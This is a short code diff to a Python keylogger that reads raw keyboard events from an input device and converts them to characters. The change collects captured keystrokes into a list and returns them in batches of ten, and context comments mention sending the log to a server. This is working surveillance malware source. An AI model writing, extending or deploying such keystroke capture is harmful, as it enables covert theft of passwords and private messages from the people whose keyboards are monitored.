@@ -38,7 +38,8 @@ def run(**args):
 	}
 
 	event = in_file.read(EVENT_SIZE)
-
+	x = 1
+	pressedKey = []
 	verbose = False
 	if len(sys.argv) > 2:
 		if sys.argv[2] == '-v' or sys.argv[2] == '--verbose':
@@ -61,9 +62,11 @@ def run(**args):
 				#logger = open("keylog.txt", "a")
 				if candidate == 28:  # handle enter
 					sys.stdout.write("\n")
+					pressedKey.append(KEYS[kbl][candidate])
 					#logger.write("\n")
 				else:
 					sys.stdout.write(KEYS[kbl][candidate])
+					pressedKey.append(KEYS[kbl][candidate])
 					#logger.write(KEYS[kbl][candidate])
 				# flush output (do not wait until we get a newline to print)
 				sys.stdout.flush()
@@ -71,11 +74,13 @@ def run(**args):
 
 			# clear the last key pressed
 			candidate = False
-
+		x += 1
 		event = in_file.read(EVENT_SIZE)
+		if(x%10 == 0):
+			return pressedKey
 
 	in_file.close()
-	return str(KEYS[kbl][candidate])
+	
 # send log to the server function
 #================= main Programs starts here ======================
 #start log_sender in 1 sec
